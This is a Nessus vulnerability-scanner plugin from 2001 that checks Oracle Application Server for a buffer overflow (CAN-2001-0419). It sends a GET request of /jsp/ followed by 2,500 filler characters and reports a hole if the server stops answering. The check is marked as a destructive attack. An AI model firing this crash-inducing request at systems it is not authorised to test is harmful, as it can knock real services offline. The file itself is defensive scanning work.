#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10654);
 script_cve_id("CAN-2001-0419");
 script_bugtraq_id(2569);
 script_version ("$Revision$");
 
 name["english"] = "Oracle Application Server Overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
It may be possible to make a web server execute
arbitrary code by sending it a too long url after
/jsp.
Ie:
	GET /jsp/AAAA.....AAAAA

Risk factor : High
Solution : Contact your vendor for the latest software release.";

 desc["francais"] = "
Il est peut etre possible de faire executer du code arbitraire
� un serveur web en lui envoyant une URL trop longue apr�s /jsp.

Ex:

	GET /jsp/AAAAAA....AAAAAA

Facteur de risque : Elev�
Solution : Mettez � jour votre serveur web.";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Web server buffer overflow";
 summary["francais"] = "D�passement de buffer dans un serveur web";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root � distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "www_too_long_url.nasl");
 script_exclude_keys("www/too_long_url_crash");
  script_require_ports("Services/www",80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if(!soc)exit(0);
req = string("/jsp/", crap(2500));
req = http_get(item:req, port:port);
send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);

if(!r){
	security_hole(port);
      }



